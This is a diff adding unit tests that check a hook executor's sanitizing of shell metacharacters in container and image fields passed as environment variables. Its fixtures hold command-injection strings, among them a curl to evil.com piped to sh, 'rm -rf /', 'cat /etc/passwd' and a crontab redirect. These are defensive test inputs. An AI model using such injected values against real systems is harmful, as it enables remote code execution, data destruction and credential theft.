@@ -447,4 +447,150 @@ describe('HookExecutor', () => {
     );
     expect(warn).not.toHaveBeenCalled();
   });
+
+  describe('buildHookConfig shell env sanitization', () => {
+    test('sanitizes dollar-sign and paren command substitution in image tag', () => {
+      const executor = createExecutor();
+      const config = executor.buildHookConfig(
+        createContainer({
+          image: {
+            name: 'registry.io/acme/web',
+            tag: { value: '1.0.0$(curl evil.com|sh)' },
+          },
+        }),
+      );
+      // $, (, ), | each become _
+      expect(config.hookEnv.DD_IMAGE_TAG).toBe('1.0.0__curl evil.com_sh_');
+    });
+
+    test('sanitizes backtick command substitution in image name', () => {
+      const executor = createExecutor();
+      const config = executor.buildHookConfig(
+        createContainer({
+          image: {
+            name: 'registry.io/acme/web`touch /pwned`',
+            tag: { value: '1.0.0' },
+          },
+        }),
+      );
+      // backticks become _
+      expect(config.hookEnv.DD_IMAGE_NAME).toBe('registry.io/acme/web_touch /pwned_');
+    });
+
+    test('sanitizes semicolons and ampersands in update-from and update-to values', () => {
+      const executor = createExecutor();
+      const config = executor.buildHookConfig(
+        createContainer({
+          updateKind: {
+            kind: 'tag',
+            localValue: '1.0.0;rm -rf /',
+            remoteValue: '2.0.0&&cat /etc/passwd',
+          },
+        }),
+      );
+      expect(config.hookEnv.DD_UPDATE_FROM).toBe('1.0.0_rm -rf /');
+      expect(config.hookEnv.DD_UPDATE_TO).toBe('2.0.0__cat /etc/passwd');
+    });
+
+    test('sanitizes control characters including newline and null byte', () => {
+      const executor = createExecutor();
+      const config = executor.buildHookConfig(
+        createContainer({
+          name: 'container\nname',
+          id: 'id\x00val',
+          image: {
+            name: 'registry.io/acme/web',
+            tag: { value: '1.0.0' },
+          },
+          updateKind: {
+            kind: 'tag',
+            localValue: null,
+            remoteValue: undefined,
+          },
+        }),
+      );
+      // newline (0x0a) and null (0x00) are control chars < 0x20, become _
+      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('container_name');
+      expect(config.hookEnv.DD_CONTAINER_ID).toBe('id_val');
+      expect(config.hookEnv.DD_UPDATE_FROM).toBe('');
+      expect(config.hookEnv.DD_UPDATE_TO).toBe('');
+    });
+
+    test('sanitizes DEL character (0x7f) in env values', () => {
+      const executor = createExecutor();
+      const config = executor.buildHookConfig(
+        createContainer({
+          image: {
+            name: 'registry.io/acme/web',
+            tag: { value: `tag\x7fval` },
+          },
+        }),
+      );
+      expect(config.hookEnv.DD_IMAGE_TAG).toBe('tag_val');
+    });
+
+    test('sanitizes redirect and pipe characters in container name and id', () => {
+      const executor = createExecutor();
+      const config = executor.buildHookConfig(
+        createContainer({
+          name: 'web>>/etc/crontab',
+          id: 'id<injected',
+        }),
+      );
+      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('web__/etc/crontab');
+      expect(config.hookEnv.DD_CONTAINER_ID).toBe('id_injected');
+    });
+
+    test('returns empty string for undefined and null container fields', () => {
+      const executor = createExecutor();
+      // Simulate containers from test fixtures that omit name/id/image/tag/updateKind fields
+      const config = executor.buildHookConfig({
+        name: undefined as unknown as string,
+        id: undefined as unknown as string,
+        image: {
+          name: undefined as unknown as string,
+          tag: { value: undefined as unknown as string },
+        },
+        updateKind: {
+          kind: undefined as unknown as string,
+          localValue: undefined,
+          remoteValue: null,
+        },
+        labels: {},
+      });
+      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('');
+      expect(config.hookEnv.DD_CONTAINER_ID).toBe('');
+      expect(config.hookEnv.DD_IMAGE_NAME).toBe('');
+      expect(config.hookEnv.DD_IMAGE_TAG).toBe('');
+      expect(config.hookEnv.DD_UPDATE_KIND).toBe('');
+      expect(config.hookEnv.DD_UPDATE_FROM).toBe('');
+      expect(config.hookEnv.DD_UPDATE_TO).toBe('');
+    });
+
+    test('passes legitimate container and image values through unchanged', () => {
+      const executor = createExecutor();
+      const config = executor.buildHookConfig(
+        createContainer({
+          name: 'my-web-container',
+          id: 'abc123def456abc123def456',
+          image: {
+            name: 'ghcr.io/acme/web-app',
+            tag: { value: 'v2.3.1-rc.1' },
+          },
+          updateKind: {
+            kind: 'digest',
+            localValue: 'sha256:abc123def456',
+            remoteValue: 'sha256:def456abc123',
+          },
+        }),
+      );
+      expect(config.hookEnv.DD_CONTAINER_NAME).toBe('my-web-container');
+      expect(config.hookEnv.DD_CONTAINER_ID).toBe('abc123def456abc123def456');
+      expect(config.hookEnv.DD_IMAGE_NAME).toBe('ghcr.io/acme/web-app');
+      expect(config.hookEnv.DD_IMAGE_TAG).toBe('v2.3.1-rc.1');
+      expect(config.hookEnv.DD_UPDATE_KIND).toBe('digest');
+      expect(config.hookEnv.DD_UPDATE_FROM).toBe('sha256:abc123def456');
+      expect(config.hookEnv.DD_UPDATE_TO).toBe('sha256:def456abc123');
+    });
+  });
 });
